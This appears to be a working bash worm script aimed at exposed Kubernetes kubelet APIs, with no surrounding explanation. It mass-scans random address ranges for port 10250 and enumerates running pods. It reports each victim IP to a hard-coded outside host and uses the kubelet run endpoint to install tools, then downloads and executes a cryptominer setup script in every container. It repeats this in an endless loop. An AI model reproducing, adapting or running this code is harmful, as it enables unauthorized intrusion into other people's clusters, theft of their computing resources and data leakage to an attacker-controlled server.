#!/bin/bash
T1OUT="120"
TEMPFILE="/tmp/"$RANDOM$RANDOM$RANDOM

function kube_pwn(){
theip=$1
timeout -s SIGKILL 20 curl -sk https://$theip:10250/runningpods/ 2>/dev/null 1>/dev/null
RESULTCHECK=$?

if [ "$RESULTCHECK" = "0" ];then
#timeout -s SIGKILL $T1OUT curl -sk https://$theip:10250/runningpods/ | jq . | grep 'namespace'
if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
wget -O /dev/null http://45.9.148.35/input/kube_in.php?target=$theip
timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >> $TEMPFILE

while read namespace podname containername; do
echo $namespace" "$podname" "$containername
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update"

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl"

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl"

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"

timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget http://45.9.148.35/chimaera/sh/setup_xmr.sh -O /tmp/.x1mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl http://45.9.148.35/chimaera/sh/setup_xmr.sh -o /tmp/.x2mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
done < $TEMPFILE
fi
}


function kube_scan(){
T_RANGE=$1
SC_RATE=$2
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $T_RANGE.0.0.0/8 -p10250 --rate=$SC_RATE | awk '{print $6}')'";

for IP_ADDR in ${!rndstr}
do
echo "$IP_ADDR:10250"
kube_pwn $IP_ADDR
done;
}

while true; do
SCAN_T=$(curl -s http://45.9.148.35/scan_threads.dat || wget -q -O - http://45.9.148.35/scan_threads.dat)
if [ -z "$SCAN_T" ];then export SCAN_T=10000;fi
RAN_GEN=$[RANDOM%255+1] 
kube_scan $RAN_GEN 20000
unset SCAN_T
unset RAN_GEN
done

exit

